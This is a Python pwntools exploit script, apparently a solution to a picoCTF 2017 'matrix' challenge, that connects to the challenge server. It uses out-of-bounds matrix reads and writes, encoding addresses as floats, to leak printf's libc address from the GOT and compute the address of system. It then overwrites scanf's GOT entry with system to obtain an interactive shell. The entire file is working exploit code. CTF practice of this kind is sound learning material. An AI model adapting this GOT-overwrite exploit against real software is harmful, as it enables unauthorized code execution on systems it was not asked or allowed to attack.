from pwn import *
import binascii
import re
import struct 

PRINTF_GOT = 0x804a108
SCANF_GOT = 0x804a12c
PRINTF_OFFSET = 0x4cc70
SYSTEM_OFFSET = 0x3e3e0

def pad_hex(hex_str):
	if len(hex_str) % 2 != 0: 
		return "0"+hex_str
	return hex_str

def fix_to_big_enidan(hex_str):
	fixed = ""
	for i in range(0,len(hex_str),2):
		fixed =  hex_str[i]+hex_str[i+1] + fixed
	return fixed


get_float = lambda hex_value: struct.unpack('>f',binascii.unhexlify(pad_hex(hex_value[2:])))[0]
get_hex = lambda float_value: "0x"+fix_to_big_enidan(struct.pack('f', float_value).encode('hex'))


def create_matrix(row, col):
	r.recvuntil("mand:")
	r.sendline("create %d %d" % (row, col))	
	r.recv(1024)


def set_value(idx, row, col, val):
	r.recvuntil("mand:")
	r.sendline("set {} {} {} {}".format(idx, row, col, val))
	r.recvline()


def get_value(idx, row, col):
	r.recvuntil("mand:")
	r.sendline("get {} {} {}".format(idx, row, col))
	result = r.recvline()
	return float(result.split("= ")[1])


def leak_libc():
	set_value(0, 2, 0, get_float(hex(PRINTF_GOT)))
	printf_libc = get_hex(get_value(1, 0, 0))
	print ("printf address at libc - " + printf_libc)
	return hex(int(printf_libc, 16) - PRINTF_OFFSET)


def overwrite_scanf_got(libc_system):
	set_value(0, 2, 0, get_float(hex(SCANF_GOT)))
	set_value(1, 0, 0, get_float(hex(int(libc_system, 16))))


def handle_logic():
	create_matrix(3, 1)
	create_matrix(1 ,1)
	libc_base = leak_libc()
	libc_system = hex(int(libc_base, 16) + SYSTEM_OFFSET)
	print ("libc base address - " + libc_base)
	print ("libc system address - " + libc_system)
	overwrite_scanf_got(libc_system)


if __name__ == "__main__":
	r = remote("shell2017.picoctf.com", 16704)
	#r = process(['./matrix'])
	handle_logic()
	r.interactive()